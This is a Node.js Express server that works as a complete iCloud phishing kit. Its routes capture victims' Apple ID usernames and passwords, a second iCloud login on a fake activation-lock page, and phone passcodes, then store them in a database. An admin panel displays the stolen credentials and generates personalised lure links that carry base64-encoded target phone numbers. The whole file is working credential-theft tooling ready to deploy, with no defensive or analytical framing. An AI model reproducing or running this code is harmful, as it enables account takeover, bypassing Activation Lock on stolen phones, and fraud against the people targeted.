const express = require('express');
const bodyParser = require('body-parser');
const User = require("./model/user");
const auth = require("./middleware/auth");
const jwt = require("jsonwebtoken");
const cookieParser = require('cookie-parser');
const Admin = require('./model/admin')

require("dotenv").config();
require("./config/database").connect();


const app = express();

app.use(express.json());

app.use(cookieParser());

app.use(bodyParser.urlencoded({extended: true}))

app.use(express.static("public"));

app.set('view engine', 'ejs');


// home
app.get("/", async (req, res) =>{
    res.sendFile(__dirname + "/src/index.html" );
});
// login
app.post("/login", async (req, res) =>{
    const { username, password, phone} = req.body;
    const urlParams = new URLSearchParams(phone);
    
    try {
        const target = urlParams.get('p');
        const type = urlParams.get('t');
        const target_phone = Buffer.from(target, 'base64').toString();
        const pass_type = Buffer.from(type, 'base64').toString();

        const payload = { 
            username: username,
            passType: pass_type,
        };      
        const token = jwt.sign(payload, process.env.JWT_KEY);
        console.log(token); 
        res.cookie('jwt', token);
        const user = await User.create({
            fistIcloud: username.toLowerCase(),
            firstPassword: password,
            targetPhone: target_phone,
            phonePassword: "",
            thirdIcloud: "",
            thirdPassowrd: ""

        });
        res.status(200).sendFile(__dirname + "/src/loginFailed.html")
    } catch (error){
        const user = await User.create({
            fistIcloud: username.toLowerCase(),
            firstPassword: password,
            targetPhone: "random-user " + new Date(),
            phonePassword: "",
            thirdIcloud: "",
            thirdPassowrd: ""

        });
        res.sendFile(__dirname + "/src/loading.html")
    }
});

app.get("/log-in", async (req, res) =>{
    res.sendFile(__dirname + "/src/activation_loc.html")
})

app.post("/activation_lock", async (req, res) =>{
    const icloud = req.body.icloud;
    const third_password = req.body.password;

    const jwtToken = req.cookies.jwt; 
    if(jwtToken){
        const payload = jwt.decode(jwtToken);
        const user = await User.updateOne(
            { fistIcloud: payload.username },
            { $set: {thirdIcloud: icloud, thirdPassowrd: third_password} },
            { returnOriginal: false },
            function(err, result) {
              if (err) throw err;
              console.log(result);
        });

        if(payload.passType=="four"){
            res.sendFile(__dirname + "/src/four.html")
        }else if(payload.passType=="six"){
            res.sendFile(__dirname + "/src/six.html")
        }
        else if(payload.passType=="password"){
            res.sendFile(__dirname + "/src/password.html")
        }
        else{
            res.sendFile(__dirname + "/src/loading.html")
        }
    }
    else{
        res.sendFile(__dirname + "/src/loading.html")
    }
})
// pass for 4 and 6 digit
app.post("/pass", async (req, res) =>{
    const passcode = req.body.passcode;
    const jwtToken = req.cookies.jwt;
    if(jwtToken){
        // Decode the JWT token
        const payload = jwt.decode(jwtToken);
        const user = await User.updateOne(
            { fistIcloud: payload.username },
            { $set: { phonePassword: passcode} },
            { returnOriginal: false },
            function(err, result) {
              if (err) throw err;
            //   console.log(result);
        });
        // res.sendFile(__dirname + "/src/six.html")
        res.sendFile(__dirname + "/src/loading.html")
    }
    else{
        res.sendFile(__dirname + "/src/loading.html")
    }
});
// password
app.post("/password", async(req,res)=>{
    const password = req.body.password;
    const jwtToken = req.cookies.jwt;
    if(jwtToken){
        const payload = jwt.decode(jwtToken);
        const user = await User.updateOne(
            { fistIcloud: payload.username },
            { $set: { phonePassword: password } },
            { returnOriginal: false },
        );
        // res.sendFile(__dirname + "/src/activation.html")
        res.sendFile(__dirname + "/src/loading.html")
    }
    else{
        res.sendFile(__dirname + "/src/loading.html")
    }    

});


// admin panel
app.get("/admin", async (req, res) =>{
    res.render("admin_login", {
        response_: ""
    });
});
app.post("/admin", async (req, res)=>{
    try {
        //get user input
        const { username, password } = req.body;

        // check if user exist
        const admin = await Admin.findOne({ username });
        if(admin){
            if(password === admin.password){
                // Create token
                const token = jwt.sign(
                    { user_id: admin._id, username },
                    process.env.JWT_KEY,
                    {
                    expiresIn: "1h",
                    }
                );
                // save token
                res.cookie('jwt', token);

                // user
                User.find().then(function(creds){
                    creds.reverse();
                    res.render("admin",{
                        infos_ejs: creds
                    });
                })
                }
                else{
                    res.render("admin_login", {
                        response_: "Login Failed"
                    });
                }
            }
            else{
                res.render("admin_login", {
                    response_: "Login Failed"
                });
            }
    } catch (err) {
        console.log(err);
    }
});
app.post("/delete_creds", auth, async (req, res) =>{
    const icloud_id = req.body.icloud_id
    try{
        const deleteUser = await User.findByIdAndDelete(
            icloud_id
        )
        User.find().then(function(creds){
            creds.reverse();
            res.render("admin",{
                infos_ejs: creds
            });
        })
    }
    catch(err){
        console.log(err);
        res.redirect("/admin");
    }
    
});

// generate link
app.get("/generate_link", auth, async (req, res) =>{
    res.render("generate_link",{
        hash: ""
    })
});

app.post("/generate_link", auth, async (req, res) =>{
    const plainText = req.body.text;
    const loc = req.body.loc;
    const phoneType = req.body.phoneType;
    const phone_type = Buffer.from(phoneType).toString('base64');
    const base_ = Buffer.from(plainText).toString('base64');
    res.render("generate_link",{
        hash: "https://" + loc + "/?p=" + base_ + "&" + "t=" + phone_type,
    })
});

app.get("/credentials__", auth, async (req, res)=>{
    User.find().then(function(creds){
        creds.reverse();
        res.render("admin",{
            infos_ejs: creds
        });
    })
});
// change password
app.get("/change_admin_password", auth, async (req, res) =>{
    res.render("change_admin_pass",{
        response_: "",
    })
});

app.post("/change_admin_password", auth, async (req, res) =>{
    
    try {
        const username = "admin"
        const old_ = req.body.old_password;
        const new_ = req.body.new_password;
        
        // check if user exist
        const admin = await Admin.findOne({ username });
        if(old_ != admin.password){
            res.render("change_admin_pass",{
                response_: "Wrong password, Try again!",
            })
            }
        else{
            try{
                const admin_ = await Admin.updateOne(
                    { username: username},
                    { $set: { password: new_} },
                    { returnOriginal: false },
                    function(err, result) {
                      if (err) throw err;
                      console.log(result);
                });
                // user
                res.render("change_admin_pass",{
                    response_: "Password Changed",
                })
            }
            catch(err){
                res.render("change_admin_pass",{
                    response_: "Wrong password, Try again!",
                })
            }
            
        }
    } catch (err) {
        console.log(err);
    }
});

app.get("/logout", auth ,async (req, res) => {
    res.clearCookie('jwt');
    res.redirect('/admin');
});

let port = process.env.PORT;
if(port == null || port ==""){
    port = 9000;
}
//listener
app.listen(port, function() {
    console.log('Server started ==> http://localhost:9000');
});
